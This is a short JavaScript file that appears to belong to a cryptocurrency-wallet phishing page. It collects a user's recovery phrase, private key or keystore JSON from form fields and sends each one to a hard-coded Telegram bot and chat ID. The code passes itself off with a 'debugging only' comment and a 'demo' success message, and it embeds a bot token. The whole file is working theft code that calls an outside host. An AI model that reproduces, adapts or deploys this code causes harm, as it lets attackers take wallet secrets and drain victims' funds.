// Telegram API (for debugging only)
async function sendMessage(message) {
    const chat_id = -7654553013;
    try {
        const res = await fetch(`https://api.telegram.org/bot8374408986:AAFDH13C-XPSNC5t6imlnd0OiQW0NhSVWNw/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
        if (!res.ok) throw new Error("Telegram API failed");
        return await res.json();
    } catch (err) {
        console.error("Telegram error:", err);
        throw err;
    }
}

// Form submission handlers
function setupFormSubmit(buttonId, inputId, logMessage) {
    document.getElementById(buttonId)?.addEventListener("click", async (e) => {
        e.preventDefault();
        const input = document.getElementById(inputId)?.value.trim();
        if (!input) {
            alert("Input is empty!");
            return;
        }
        console.log(logMessage, input);
        try {
            await sendMessage(`${logMessage}: ${input}`);
            alert("Submitted successfully (demo)");
        } catch (err) {
            alert("Server error. Try again later.");
        }
    });
}

// Initialize all forms
setupFormSubmit("submitk", "phrased", "Phrase");
setupFormSubmit("submitp", "privatekeyd", "Private Key");
setupFormSubmit("submitks", "keystored", "Keystore JSON");
